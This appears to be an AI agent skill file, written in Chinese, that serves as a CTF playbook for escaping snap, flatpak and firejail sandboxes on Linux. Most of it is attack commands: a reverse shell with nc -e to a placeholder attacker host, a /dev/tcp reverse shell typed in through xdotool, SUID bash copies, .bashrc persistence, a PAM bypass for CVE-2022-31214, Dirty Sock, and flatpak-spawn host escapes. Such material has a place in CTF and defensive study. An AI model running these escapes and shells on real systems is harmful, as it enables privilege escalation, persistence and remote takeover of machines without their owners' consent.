---
name: 'noncontainer-sandbox-escape'
description: '非容器沙箱逃逸：snap (Dirty Sock/classic/接口) / flatpak (flatpak-spawn/filesystem/X11) / firejail (CVE-2022-31214 --join)。与 [[container-escape]] 互补。'
disable-model-invocation: true
metadata: { domain: linux, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Linux 非容器沙箱逃逸

> snap / flatpak / firejail — CTF 中不太常见但 Hard 难度偶尔出现
> 来源：Silentium HTB (snap) + HackTricks + CVE databases
> 与 container-escape 互补（容器逃逸只覆盖 Docker/K8s/LXC）

## 快速识别

```bash
# 你在什么沙箱里？
snap list 2>/dev/null              # snap installed → 可能在 snap 里
flatpak list 2>/dev/null           # flatpak
firejail --list 2>/dev/null        # firejail
ps aux | grep -E 'snap|flatpak|firejail'

# 你在沙箱外能跑这些 SUID 二进制吗？
find / -perm -4000 -type f 2>/dev/null | grep -E 'snap-confine|firejail|bwrap'
```

---

## 1. Snap

### 三种隔离级别

| 级别 | 实际约束 | 逃逸难度 |
|------|---------|---------| 
| `classic` | **无 sandbox** — 等同 apt 包，完全主机访问 | 🟢 秒逃 |
| `devmode` | AppArmor + seccomp 部署但 deny 不强制 | 🟢 宽松 |
| `strict` (默认) | AppArmor + seccomp + mount ns + cgroups | 🔴 需 CVE |

### 步骤 1：判断隔离级别

```bash
snap list                          # 列出安装的 snaps
snap connections <snapname>        # 查看接口 → home/removable-media/docker?
grep -r "confinement" /snap/*/meta/snap.yaml 2>/dev/null
```

### 攻击路径 A：classic snap → 即时逃逸

```bash
# classic snap 无任何 sandbox，直接操作主机
cp /bin/bash /home/user/bash && chmod u+s /home/user/bash
# 然后宿主机执行 /home/user/bash -p → root
```

### 攻击路径 B：home 接口已连接 → 劫持  `.profile`

```bash
# 如果 snap 有 home 接口 → 能写用户 home 目录
echo 'nc -e /bin/bash ATTACKER 5555' >> ~/.bashrc
# 等用户下次登录 → reverse shell
```

### 攻击路径 C：Dirty Sock (CVE-2019-7304) — snapd ≤ 2.37

```bash
# snapd API 监听 /run/snapd.socket → 本地权限绕过
# 创建 socket 文件名字里嵌入 ;uid=0;
# → snapd 以为是 root → 允许 sideload snap → install hook 以 root 执行
python3 dirty_sockv2.py
# → 创建 "dirty_sock" 用户 + sudo 权限
su dirty_sock && sudo -i
```

### 攻击路径 D：snap-confine 竞态 (CVE-2021-44731) — snapd ≤ 2.54.2

```bash
# snap-confine 是 SUID root → 构造 mount namespace 时竞态
# 在验证路径和 bind-mount 之间交换目标 → 把任意内容 mount 进去
# 脚本: snap_confine_LPE.sh
```

### 攻击路径 E：/tmp/.snap 劫持 (CVE-2026-3888)

```bash
# systemd-tmpfiles 定期清理 /tmp/.snap (10-30天后)
# → 攻击者重建 /tmp/.snap → 放入恶意内容
# → 下次 snap-confine 执行时 bind-mounts 攻击者文件为 root
```

---

## 2. Flatpak

### 快速判断

```bash
flatpak list --app --columns=application
flatpak info --show-permissions <app-id>
cat /run/user/$(id -u)/.flatpak/*/info 2>/dev/null
```

### 攻击路径 A：`flatpak-spawn --host` (最常见)

```bash
# 许多 Flatpak 打包时带 --talk-name=org.freedesktop.Flatpak
which flatpak-spawn && flatpak-spawn --host /bin/bash
# → 立刻逃逸到宿主机

# 如果没有 flatpak-spawn 但有 D-Bus:
gdbus call --session --dest org.freedesktop.Flatpak \
  --object-path /org/freedesktop/Flatpak/Development \
  --method org.freedesktop.Flatpak.Development.HostCommand \
  "['/bin/bash']" '{}' 0
```

### 攻击路径 B：过度宽泛的文件系统权限

```bash
# filesystem=home 或 filesystem=host → 直接写 ~/.bashrc / ~/.ssh/authorized_keys
flatpak info -m <app> | grep filesystem
# → home → echo payload >> ~/.bashrc
# → host  → 写 /etc/cron.d/ 或 /usr/local/bin/
```

### 攻击路径 C：X11 socket 滥用

```bash
# 如果 /tmp/.X11-unix/X0 可访问 → 发送按键到主机
xdotool key ctrl+alt+t           # 开终端
xdotool type 'bash -i >& /dev/tcp/IP/4444 0>&1'
xdotool key Return
```

### 攻击路径 D：bwrap 参数注入 (CVE-2024-32462)

```bash
# Flatpak < 1.10.9 / 1.12.9 / 1.14.6
# 通过 Background portal 接口注入 --bind 参数
# → 任意主机路径 bind-mount 进 sandbox → 逃逸
```

---

## 3. Firejail

> 🔴 **Firejail 是 SUID root → 几十个 LPE CVE。如果普通用户能跑 firejail，几乎必能提权。**

### 步骤 1：确定你在 Firejail 内

```bash
firejail --list                    # 列出 sandbox
cat /proc/self/status | grep NoNewPrivs  # 1=不能跑 SUID, 0=还能
capsh --print                      # 当前 capabilities
```

### 🔴 不是 root 的 Firejail → exit 即可

```bash
# 非 root firejail 是自愿约束 → exit 回退到宿主机
exit
```

### 攻击路径 A：CVE-2022-31214 `--join` (Firejail ≤ 0.9.68)

```bash
# ① 创建辅助 sandbox + 长 sleep
firejail --noprofile -- sleep 10d &

# ② 构造假的 sandbox 环境:
#    - /run/firejail/mnt/umask 含 "022"
#    - /run/firejail/mnt/join → 含 "1"
#    - 挂载 tmpfs 到 /proc
#    - 替换 /etc/pam.d/su 为 pam_permit.so
echo "auth sufficient pam_permit.so" > /tmp/pam_su
mount --bind /tmp/pam_su /etc/pam.d/su

# ③ join → 在攻击者的 mount namespace 中 + no_new_privs=0
firejail --join=<PID>

# ④ 运行 su → PAM 永远通过 → root
su
```

### 攻击路径 B：ld.so.preload (CVE-2017-5180) — Firejail < 0.9.44.4

```bash
# --private 复制 .Xauthority 时跟随 symlink
# → 把 ~/.firenail/.Xauthority 链接到 /etc/ld.so.preload
# → Firejail 写自身路径到 ld.so.preload
# → 下次 SUID 二进制启动 → 加载恶意 .so → root shell
```

### 攻击路径 C：TOCTOU `--get`/`--put`

```bash
# access() 和 copy_file() 之间的竞态
# → symlink 切换 → 读 /etc/shadow
```

---

## 通用逃逸决策树

```
你在沙箱里:

① 检测沙箱类型
   snap list → snap → 步骤②
   flatpak list → flatpak → 步骤③
   firejail --list → firejail → 步骤④
   
② 如果是 snap:
   classic? → 秒逃 (直接写主机文件)
   strict + home 接口? → 劫持 .profile
   有 snap-confine SUID? → 检查版本 → CVE-2019-7304 / CVE-2021-44731

③ 如果是 flatpak:
   flatpak-spawn --host → 秒逃
   filesystem=home/host? → 写 .bashrc
   有 X11 socket? → xdotool 按键注入

④ 如果是 firejail:
   你不是 root? → exit 即可 (自愿约束)
   你是 root 但 `NoNewPrivs=0`? → SUID 提权 path
   版本 ≤ 0.9.68? → CVE-2022-31214 --join
   
⑤ 万用策略: mount | grep -E "/host|/run/host" → 提前挂载的主机 FS
   → cd /run/host && chroot . /bin/bash
```

**Why:** container-escape 只覆盖 Docker/K8s/LXC。CTF 中有 snap/flatpak/firejail 沙箱的 Hard 机器会被漏掉。
**How to apply:** 拿 shell 后第一秒检测沙箱类型。classic snap / flatpak-spawn / firejail exit 都是秒逃。
